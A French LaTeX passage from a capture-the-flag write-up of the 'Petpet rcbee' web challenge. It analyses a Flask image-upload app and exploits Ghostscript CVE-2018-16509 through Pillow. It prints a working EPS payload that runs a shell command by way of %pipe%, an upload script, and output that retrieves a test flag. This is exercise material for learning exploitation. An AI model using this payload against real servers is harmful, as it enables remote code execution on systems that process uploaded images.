\section{Petpet rcbee}

on va donc avoir à faire à du file uplpoad.

gestion des extensions possibles png, jpgn jpeg

\begin{verbatim}
def allowed_file(filename):
    return '.' in filename and \
        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
\end{verbatim}

double extension

\begin{verbatim}
def savemp(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, secure_filename(file.filename))
    file.save(path)
    return path
\end{verbatim}

securise le nom du fichier en virant les espaces en remplacant les \verb+/+ par
des \verb+_+\ldots

\begin{verbatim}
def petmotion(bee, frames):
    outputFrames = []

    for frame in frames:
        newFrame, i = Image.new('RGBA', frame.size), frames.index(frame)
        width   = int(75*(0.8 + i * 0.02))
        height  = int(75*(0.8 + i * 0.05))
        kaloBee = bee.resize((width, height))
        frame   = frame.convert('RGBA')
        newFrame.paste(kaloBee, mask=kaloBee, box=(30, 37))
        newFrame.paste(frame, mask=frame)
        outputFrames.append(newFrame)

    return outputFrames
\end{verbatim}


Pour chaque de la liste merge l'image avec l'image uploadé


\begin{verbatim}
def petpet(file):

    if not allowed_file(file.filename):
        return {'status': 'failed', 'message': 'Improper filename'}, 400

    try:

        tmp_path = save_tmp(file)

        bee = Image.open(tmp_path).convert('RGBA')
        frames = [Image.open(f) for f in sorted(glob.glob('application/static/img/*'))]
        finalpet = petmotion(bee, frames)

        filename = f'{generate(14)}.gif'
        finalpet[0].save(
            f'{main.app.config["UPLOAD_FOLDER"]}/{filename}',
            save_all=True,
            duration=30,
            loop=0,
            append_images=finalpet[1:],
        )

        os.unlink(tmp_path)

        return {'status': 'success', 'image': f'static/petpets/{filename}'}, 200

    except:
        return {'status': 'failed', 'message': 'Something went wrong'}, 500
\end{verbatim}


donc si bypass extension, sauvegarde l'image en temporaire
converti l'image en RGBA la merge avec la liste des images static
fauvegarde l'image resultante en .gif
et detruit l'upload.

la librairie ppour les images c'est \verb+pillow+

la question est donc que se passe-t'il quand cette lib manipule un fichier
python. ca plante. Le seul souci c'est que le fichier est nétoyé dans le try
donc il n'est pas nétoyé quand ca plante.i et donc notre script est dans 
\verb+/tmp/+ nomé tel qu'on le veut.
sauf que c'est pas atteignable que c'eest pas dans la bonne extension.
donc il faut bien que cela fonctionne.

\url{https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509}

qui correspond bien à la version de Ghostscript du dockerfile

\begin{verbatim}
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cp /app/flag /app/application/static/petpets/flag) currentdevice putdeviceprops
\end{verbatim}

\begin{verbatim}
url = f"http://{target}/api/upload"
files = {'file': ('./rce.jpg', open('./rce.jpg', 'rb'))}
#r = requests.post(url, files=files)
r = requests.post(url, files=files)
print(r.text)
\end{verbatim}


\begin{verbatim}
$ python exploit.py
{"image":"static/petpets/fc4b95b472103f2a4aecf6110f5d.gif","status":"success"}
$ curl http://<REDACTED>:1337/static/petpets/flag
HTB{f4k3_fl4g_f0r_t3st1ng}
\end{verbatim}

mais ne passe pas sur la prod.


